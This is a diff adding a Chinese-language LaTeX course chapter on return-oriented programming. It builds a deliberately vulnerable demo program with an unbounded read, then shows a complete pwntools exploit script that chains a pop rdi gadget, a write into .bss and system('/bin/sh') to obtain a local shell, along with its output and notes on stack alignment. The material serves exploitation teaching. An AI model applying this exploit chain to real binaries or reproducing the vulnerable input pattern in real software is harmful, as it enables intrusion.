@@ -1,0 +1,333 @@
+\section{專題課 A：從零開始的 ROP}
+\label{chap:rop}
+
+前面兩題都是「跳到一個現成的函式」。但真實題目很少這麼好心：目標通常不是一個 \code{win()}，
+而是 \code{system("/bin/sh")}——你要\textbf{呼叫一個函式，還要傳參數給它}。
+再加上 NX 讓你不能把 shellcode 寫進 stack 執行，那該怎麼辦？答案就是 ROP。
+
+這一章我不打 CTF 題，而是自己做一個小程式 \file{rop\_demo}，
+把 ROP 的每個零件拆開給你看。打完這一章，你再看後面三題的 heap 題會輕鬆很多，
+因為\textbf{ROP 和 heap 攻擊其實是同一件事}：都是在「控制別人的資料」，
+只是一個控制 stack，一個控制 heap。
+
+\subsection{為什麼 ret2win 不夠用}
+
+\begin{enumerate}[leftmargin=1.5em,itemsep=3pt]
+  \item \textbf{參數問題}：\code{win()} 不吃參數。
+        只要把位址填進 \code{return address} 就好。
+        但如果目標是 \code{system("/bin/sh")}，那就不一樣了：
+        得先讓 \code{rdi} 指向字串 \code{"/bin/sh"}，
+        然後才跳到 \code{system}。
+        \textbf{一個 \code{return address} 塞不下兩件事}。
+  \item \textbf{NX}：stack 不可執行，所以「把 shellcode 寫進去再跳過去」這條路被封死。
+  \item \textbf{ASLR}：就算知道 \code{system} 在 libc 裡，位址每次都不一樣，需要先 leak。
+\end{enumerate}
+
+ROP（Return-Oriented Programming）的答案是：
+
+\begin{keybox}[一句話講完 ROP]
+\textbf{不要注入程式碼，而是把程式裡「本來就有的片段」串起來。}
+每個片段都以 \code{ret} 結尾，而被 \code{ret} 彈進 \code{rip} 的位址來自 stack——
+所以\textbf{只要你控制 stack，你就能遙控程式一段一段地執行你排好的順序}。
+\end{keybox}
+
+\subsection{關鍵：\code{ret} 是一個「從 stack 讀位址的跳躍」}
+
+回到第二章那句定義：
+
+\begin{lstlisting}[style=asm]
+ret   ==   pop  rip        ; 把 rsp 指的那 8 bytes 彈進 rip，然後 rsp += 8
+\end{lstlisting}
+
+注意兩件事：
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
+  \item \code{ret} 執行完，\code{rsp} 會\textbf{往高位址移動 8 bytes}（因為 stack 是往下長的，
+        pop 等於「收回」）。所以\textbf{下一格}就是下一次 \code{ret} 會讀的地方。
+  \item 你已經用 overflow 控制了這塊記憶體 $\Rightarrow$ \textbf{你控制了「下一個要跳去哪裡」，而且可以控制很多次}。
+\end{itemize}
+
+\begin{whybox}[把 ROP chain 想成「你自己造的 call stack」]
+正常的程式：\code{call} 幫你把返回位址 push 上去，\code{ret} 幫你彈回來。
+ROP 的世界：\textbf{你手動把「返回位址」排成一列}，
+每一格都是「某個 gadget 的位址」，gadget 執行完的 \code{ret} 又去讀下一格。
+於是你用 data（stack 上的位址）遙控了 control flow。
+\end{whybox}
+
+\subsection{gadget：以 \code{ret} 結尾的小片段}
+
+gadget 就是「一串指令，最後一個是 \code{c3}（\code{ret}）」。
+最基本、最常用的兩個是：
+
+\begin{longtable}{@{}p{4.6cm}p{3.2cm}p{7.0cm}@{}}
+\toprule
+\textbf{gadget} & \textbf{機器碼} & \textbf{效果}\\
+\midrule
+\endhead
+\code{pop rdi ; ret} & \code{5f c3} & 從 stack 彈一格進 \code{rdi}，然後 ret。\\
+\code{ret}           & \code{c3}    & 什麼都不做，只是把 \code{rsp} 往前推 8 bytes。\\
+\bottomrule
+\end{longtable}
+
+為什麼是 \code{rdi}？因為第二章那張 ABI 表：\textbf{第一個整數/指標參數在 \code{rdi}}。
+所以 \code{pop rdi ; ret} 就是「把下一個 8 bytes 當作第一個參數」。
+
+\begin{keybox}[怎麼找 gadget]
+\begin{lstlisting}[style=sh]
+ROPgadget --binary ./chal | grep 'pop rdi ; ret'
+ropper -f ./chal --search 'pop rdi'
+\end{lstlisting}
+或在 pwntools 裡：
+\begin{lstlisting}[style=py]
+rop = ROP(elf)
+rop.rdi            # 自動找 pop rdi ; ret
+rop.find_gadget(['pop rdi', 'ret'])
+\end{lstlisting}
+\textbf{現實提醒}：小程式裡常常一個 \code{pop rdi ; ret} 都找不到（編譯器不會產生沒用到的指令）。
+這時候有三條路：(1) 從 libc 裡找（需要 leak）；(2) 用 \code{ret2csu}（見 \ref{sec:ret2csu}）；
+(3) 自己寫一個（本講義的 demo 就是這樣做，見下節）。
+\end{keybox}
+
+\subsection{一個真的 ROP chain：逐步拆解}
+
+\file{rop\_demo.c} 是我為了教學寫的，重點是\textbf{故意讓它沒有現成的 gadget}，
+再把一個 \code{pop rdi ; ret} 用 \code{naked} 函式「種」進去：
+
+\begin{lstlisting}[style=c]
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+/* 讓 system@plt 留在 binary 裡（其實從沒被呼叫） */
+void unused(void) { system("echo never called"); }
+
+/* 手工種一個 pop rdi ; ret，讓 demo 自給自足。
+   真實題目要從 libc 拿（需先 leak）或用 ret2csu。 */
+__attribute__((naked)) void gadget_pop_rdi_ret(void) {
+    __asm__ volatile("pop %rdi\n ret\n");
+}
+
+char *mygets(char *s) { int i = 0; char c;          /* 不限長度，等同 gets() */
+    while (read(0, &c, 1) == 1 && c != '\n') s[i++] = c;
+    s[i] = 0; return s; }
+
+void vuln(void) { char buf[64]; mygets(buf); puts("bye"); }
+
+int main(void) { setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IONBF, 0);
+                 puts("[*] rop demo - give me a line:"); vuln(); return 0; }
+\end{lstlisting}
+
+編譯指令（\code{-no-pie} 讓我們可以寫死位址）：
+
+\begin{lstlisting}[style=sh]
+gcc -fno-stack-protector -no-pie -O0 rop_demo.c -o rop_demo
+\end{lstlisting}
+
+\begin{warnbox}[為什么要自己寫 \code{mygets}]
+現代 GCC 直接拒絕編譯 \code{gets}（連結時會給你 \code{implicit declaration} 的錯誤）。
+所以 demo 用 \code{read(0,\&c,1)} 迴圈手寫一個。\textbf{行為和 \code{gets} 一樣：不檢查長度}。
+\end{warnbox}
+
+四個關鍵位址（都是從 \code{nm} / \code{objdump} / \code{ELF} 取得）：
+
+\begin{longtable}{@{}p{5.2cm}p{3.0cm}p{6.6cm}@{}}
+\toprule
+\textbf{符號} & \textbf{位址} & \textbf{用途}\\
+\midrule
+\endhead
+\code{pop rdi ; ret}    & \code{0x40117c} & 設第一個參數\\
+\code{mygets}           & \code{0x401181} & 把字串寫進指定位置（這裡當「寫入器」）\\
+\code{system@plt}       & \code{0x401040} & 目標函式\\
+\code{.bss}（\code{0x404230}）& \code{0x404230} & 可寫、位址固定的空區域\\
+\bottomrule
+\end{longtable}
+
+先看漏洞點：
+
+\begin{lstlisting}[style=asm]
+00000000004011e9 <vuln>:
+  4011e9:  push   rbp
+  4011ea:  mov    rbp,rsp
+  4011ed:  sub    rsp,0x40              ; buf[64]
+  4011f1:  lea    rax,[rbp-0x40]
+  4011f5:  mov    rdi,rax
+  4011f6:  call   401181 <mygets>       ; 不限長度 -> overflow
+  4011fb:  puts("bye")
+  4011ff:  leave
+  401200:  ret
+\end{lstlisting}
+
+所以 \code{offset = 0x40 + 8 = 0x48 = 72}。
+
+\subsubsection{chain 的內容}
+
+\begin{lstlisting}[style=raw]
+    [ 72 bytes 的 'A' ][ saved rbp 被蓋掉 ]
+    +0x48  pop rdi ; ret      0x40117c
+    +0x50  .bss               0x404230      <-- 這是 pop 進 rdi 的值
+    +0x58  mygets             0x401181      <-- 呼叫 mygets(0x404230)
+    +0x60  pop rdi ; ret      0x40117c
+    +0x68  .bss               0x404230      <-- 這是要傳給 system 的參數
+    +0x70  system@plt         0x401040      <-- 呼叫 system(0x404230)
+\end{lstlisting}
+
+\begin{keybox}[讀 chain 的方法：從上往下，一次「吃」兩格或一格]
+\begin{longtable}{@{}p{1.4cm}p{4.2cm}p{9.4cm}@{}}
+\toprule
+\textbf{步} & \textbf{執行到} & \textbf{發生什麼事}\\
+\midrule
+\endhead
+1 & \code{pop rdi ; ret} & \code{rdi = 0x404230}（吃掉下一格），然後 \code{ret} 讀再下一格\\
+2 & \code{mygets} & 呼叫 \code{mygets(0x404230)}：等我們輸入一行字，寫到 \code{.bss}。做完它自己的 \code{ret} 讀再下一格\\
+3 & \code{pop rdi ; ret} & \code{rdi = 0x404230}（現在那裡已經是 \code{"/bin/sh"}），再 \code{ret}\\
+4 & \code{system@plt} & \code{system("/bin/sh")} $\Rightarrow$ \textbf{拿到 shell}\\
+\bottomrule
+\end{longtable}
+\end{keybox}
+
+\begin{whybox}[為什麼不能直接 \code{system("/bin/sh")}？非得先寫進 .bss？]
+因為 \textbf{binary 裡根本沒有 \code{"/bin/sh"} 這個字串}。你可以自己驗證：
+
+\begin{lstlisting}[style=sh]
+$ strings -a ./rop_demo | grep '/bin/sh'
+$ echo $?
+1                     # 找不到
+\end{lstlisting}
+
+所以我們用 \code{mygets} 當「寫入器」，把 \code{/bin/sh} 寫到一個\textbf{位址固定又可寫}的地方。
+\code{.bss} 就是這種地方（未初始化的全域變數區，No PIE 時位址永遠是 \code{0x404230}）。
+
+\textbf{這就是 ROP 的通用套路}：gadget 只能設暫存器，不能「產生新資料」，
+所以需要資料時，就\textbf{用一個會寫入的函式（\code{gets}/\code{read}/\code{mygets}）先把資料放好}，
+再讓真正想呼叫的函式去讀它。後面 heap 題的 tcache poisoning 是同一招的變形。
+\end{whybox}
+
+\subsection{16-byte 對齊：一個真的會爆的示範}
+
+現在講第三章那個「多餘的 \code{ret}」。我用同一支 \file{rop\_demo}
+做 A/B 對照：兩條 chain 只差「開頭有沒有多插一個 \code{ret}」。
+
+\begin{lstlisting}[style=py]
+for label, extra in (('aligned chain        ', b''),
+                     ('chain + one extra ret', p64(RET))):
+    payload  = b'A' * (0x40 + 8) + extra
+    payload += p64(POP) + p64(BSS) + p64(mygets)
+    payload += p64(POP) + p64(BSS) + p64(system)
+    ...
+\end{lstlisting}
+
+實測結果：
+
+\begin{lstlisting}[style=raw]
+aligned chain         -> SHELL OK
+chain + one extra ret -> SIGSEGV, no shell
+\end{lstlisting}
+
+\begin{whybox}[差 8 bytes 為什麼會死？]
+x86-64 的 ABI 要求：\textbf{執行 \code{call} 前 \code{rsp} 必須 16-byte 對齊}。
+編譯器產生的函式開頭是 \code{push rbp}（-8）加 \code{sub rsp,N}，
+所以進入函式後 \code{rsp \%= 16 == 8}，等到它要 \code{call} 下一個函式時又會剛好對齊。
+
+你多插一個 \code{ret}，等於讓 \code{rsp} 少前進 8 bytes，
+於是 \code{system} 內部的 SSE 指令 \code{movaps} 搬到了一個沒對齊的位址 $\Rightarrow$ SIGSEGV。
+\textbf{它不是在參數或位址上出錯，純粹是對齊。}
+所以 debug 的時候如果「位址都對、邏輯都對，但就是 SIGSEGV」，
+第一件事就是：在 chain 最前面加一個 \code{ret} 試試。
+\end{whybox}
+
+\begin{keybox}[怎麼判斷要不要加？]
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
+  \item 進去 \code{system} 的那一格，前面少一個 \code{ret} 就爆 $\Rightarrow$ 加一個 \code{ret}。
+  \item 反過來（加了反而爆）就把 \code{ret} 拿掉。
+  \item 也可以看 gdb：\code{movaps} 爆掉的位址結尾是不是 8 而不是 0。
+\end{itemize}
+\textbf{這是經驗法則，不是定理}——第三章的 ret2win 就是「加不加都過」，
+因為它的目標函式剛好不挑對齊。
+\end{keybox}
+
+\subsection{完整腳本與輸出}
+
+\begin{lstlisting}[style=py]
+#!/usr/bin/env python3
+from pwn import *
+context.arch = 'amd64'; context.log_level = 'info'
+
+e = ELF('./rop_demo', checksec=False)
+POP_RDI = e.symbols['gadget_pop_rdi_ret']    # 0x40117c
+MYGETS  = e.symbols['mygets']                # 0x401181
+SYSTEM  = e.plt['system']                    # 0x401040
+BSS     = e.bss(0x200)                       # 0x404230
+
+payload  = b'A' * (0x40 + 8)
+payload += p64(POP_RDI) + p64(BSS) + p64(MYGETS)
+payload += p64(POP_RDI) + p64(BSS) + p64(SYSTEM)
+
+io = process('./rop_demo')
+io.recvuntil(b'line:\n')
+io.sendline(payload)                          # 第 1 次讀：ROP chain
+io.sendline(b'/bin/sh')                       # 第 2 次讀：mygets() 把這行寫進 .bss
+io.sendline(b'echo ROP_SHELL_OK; id -un')     # 第 3 次讀：這時候已經是 shell
+print(io.recvall(timeout=3).decode(errors='replace'))
+\end{lstlisting}
+
+\begin{lstlisting}[style=raw]
+bye
+ROP_SHELL_OK
+kzzz
+\end{lstlisting}
+
+看到 \code{bye}（\code{vuln} 的 \code{puts}）之後就跳出 \code{ROP\_SHELL\_OK}，
+代表我們真的拿到了 \code{system("/bin/sh")}。
+
+\begin{keybox}[注意三次 \code{sendline} 的對應關係]
+這是新手最容易搞混的地方——ROP chain 是「資料」，但其中一個環節會\textbf{再讀一次輸入}：
+
+\begin{longtable}{@{}p{2.4cm}p{4.6cm}p{8.0cm}@{}}
+\toprule
+\textbf{第幾次} & \textbf{被誰讀} & \textbf{內容}\\
+\midrule
+\endhead
+1 & \code{vuln} 的 \code{mygets} & 整條 ROP chain（會 overflow）\\
+2 & chain 裡呼叫的 \code{mygets(0x404230)} & 字串 \code{/bin/sh}，寫進 \code{.bss}\\
+3 & \code{system} 進 shell 之後 & 你要下的指令\\
+\bottomrule
+\end{longtable}
+\end{keybox}
+
+\subsection{真實題目的 gadget 從哪裡來}
+\label{sec:ret2csu}
+
+demo 裡的 \code{pop rdi ; ret} 是我種的。真實的題目你有三條路：
+
+\begin{longtable}{@{}p{3.6cm}p{11.4cm}@{}}
+\toprule
+\textbf{來源} & \textbf{說明與限制}\\
+\midrule
+\endhead
+libc 裡的 gadget &
+  最常見。libc 很大，\code{pop rdi ; ret}、\code{pop rsi ; ret}、甚至 \code{one\_gadget}
+  都有。\textbf{前提是要先 leak libc base}（例如 \code{printf} 洩漏一個 libc 位址後扣掉 offset）。\\
+\code{ret2csu} &
+  用 \code{\_\_libc\_csu\_init} 裡面那兩段程式碼：
+  一段能 \code{pop rbx / rbp / r12 / r13 / r14 / r15 ; ret}，
+  另一段是 \code{mov rdx, r14 ; mov rsi, r13 ; mov edi, r12d ; call [r15+rbx*8]}。
+  組合起來可以控制 \code{rdi/rsi/rdx} 並呼叫任意函式。\\
+   & $\Rightarrow$ \textbf{不需要 libc}，在 No PIE 的 binary 裡就能用。是「找不到 \code{pop rdi}」時的救命工具。\\
+手工植入 &
+  像本 demo。實務上只有你自己寫的練習程式才會這樣做，但它是理解 ROP 最好的方式。\\
+\bottomrule
+\end{longtable}
+
+\begin{keybox}[ROPE 的萬用句型]
+不管哪一題，chain 幾乎都是這個形狀：
+
+\begin{lstlisting}[style=raw]
+[ padding + saved rbp ]
+[ gadget: 設參數1 ] [ 參數1 ]
+[ gadget: 設參數2 ] [ 參數2 ]
+[ 目標函式 ]                      <-- 例如 system / execve / 一個 print flag 的函式
+[ 收尾 ]                          <-- 例如再呼叫 exit()，或直接不管（反正要爆）
+\end{lstlisting}
+
+把這個句型記住，你就會發現\textbf{後面三題的 heap 攻擊，其實是把「設參數」換成「改資料」}，
+本質上還是同一件事。
+\end{keybox}
